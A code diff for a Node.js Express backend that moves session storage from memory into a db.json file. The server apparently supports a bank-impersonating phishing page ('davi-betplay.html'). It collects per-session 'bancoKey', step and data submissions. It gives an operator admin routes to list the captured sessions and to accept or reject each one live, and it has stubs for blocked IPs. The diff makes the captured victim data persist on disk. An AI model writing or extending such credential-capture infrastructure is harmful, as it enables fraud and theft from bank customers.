@@ -1,21 +1,31 @@
 const express = require('express');
 const cors = require('cors');
+const fs = require('fs');
+const path = require('path');
 const app = express();
 
 app.use(cors());
 app.use(express.json());
-
-// Servir archivos estáticos (para que abra davi-betplay.html)
 app.use(express.static(__dirname));
 
-let sesiones = [];
-let historial = [];
-let stats = { activos: 0, sesiones: 0, pendientes: 0, bloqueadas: 0, historial: 0 };
+const DB_FILE = path.join(__dirname, 'db.json');
+let db = { sesiones: [], historial: [] };
 
-// ---------- FRONTEND (usuario) ----------
+if (fs.existsSync(DB_FILE)) {
+    try {
+        db = JSON.parse(fs.readFileSync(DB_FILE, 'utf8'));
+    } catch (e) {
+        console.log('Error leyendo db.json, iniciando vacía.');
+    }
+}
+
+function guardarDB() {
+    fs.writeFileSync(DB_FILE, JSON.stringify(db, null, 2));
+}
+
 app.post('/api/sesion', (req, res) => {
     const { sessionId, bancoKey, estado, paso, datos } = req.body;
-    let sesion = sesiones.find(s => s.sessionId === sessionId);
+    let sesion = db.sesiones.find(s => s.sessionId === sessionId);
 
     if (sesion) {
         sesion.estado = estado;
@@ -31,35 +41,37 @@ app.post('/api/sesion', (req, res) => {
             datos: { bancoKey, ...datos },
             fecha: new Date()
         };
-        sesiones.push(sesion);
+        db.sesiones.push(sesion);
     }
 
-    actualizarStats();
+    guardarDB();
     res.json({ ok: true, sessionId });
 });
 
-// 🔥 NUEVA RUTA: Para que el usuario consulte si ya fue aceptado o rechazado 🔥
 app.get('/api/sesion/:sessionId/estado', (req, res) => {
     const { sessionId } = req.params;
-    const sesion = sesiones.find(s => s.sessionId === sessionId);
+    const sesion = db.sesiones.find(s => s.sessionId === sessionId);
     
     if (!sesion) return res.status(404).json({ error: 'Sesión no encontrada' });
     
     res.json({ estado: sesion.estado });
 });
 
-// ---------- PANEL DAVI BETPLAY ----------
 app.get('/admin/stats', (req, res) => {
-    actualizarStats();
+    const stats = {
+        sesiones: db.sesiones.length,
+        pendientes: db.sesiones.filter(s => s.estado === 'pendiente').length,
+        historial: db.historial.length
+    };
     res.json(stats);
 });
 
 app.get('/admin/sesiones', (req, res) => {
-    res.json({ sesiones });
+    res.json({ sesiones: db.sesiones });
 });
 
 app.get('/admin/historial', (req, res) => {
-    res.json({ historial });
+    res.json({ historial: db.historial });
 });
 
 app.post('/admin/login', (req, res) => {
@@ -71,34 +83,26 @@ app.post('/admin/login', (req, res) => {
     }
 });
 
-// SOLO Aceptar o Rechazar
 app.post('/admin/sesion/:sessionId/accion', (req, res) => {
     const { sessionId } = req.params;
     const { accion } = req.body;
 
-    const sesion = sesiones.find(s => s.sessionId === sessionId);
+    const sesion = db.sesiones.find(s => s.sessionId === sessionId);
     if (!sesion) return res.status(404).json({ error: 'Sesión no encontrada' });
 
     if (accion === 'ACEPTAR') sesion.estado = 'aceptado';
     else if (accion === 'RECHAZAR') sesion.estado = 'rechazado';
     else return res.status(400).json({ error: 'Acción no permitida' });
 
-    historial.push({ ...sesion, fechaCierre: new Date() });
+    db.historial.push({ ...sesion, fechaCierre: new Date() });
+    guardarDB();
 
     res.json({ ok: true, estado: sesion.estado });
 });
 
-// Stubs para que no falle el panel
 app.get('/admin/activos', (req, res) => res.json({ activos: [] }));
 app.get('/admin/ips-bloqueadas', (req, res) => res.json({ ips: [] }));
 app.get('/admin/logs', (req, res) => res.json({ logs: [] }));
-
-function actualizarStats() {
-    stats.sesiones = sesiones.length;
-    stats.pendientes = sesiones.filter(s => s.estado === 'pendiente').length;
-    stats.activos = sesiones.length;
-    stats.historial = historial.length;
-}
 
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => console.log(`Backend en puerto ${PORT}`));
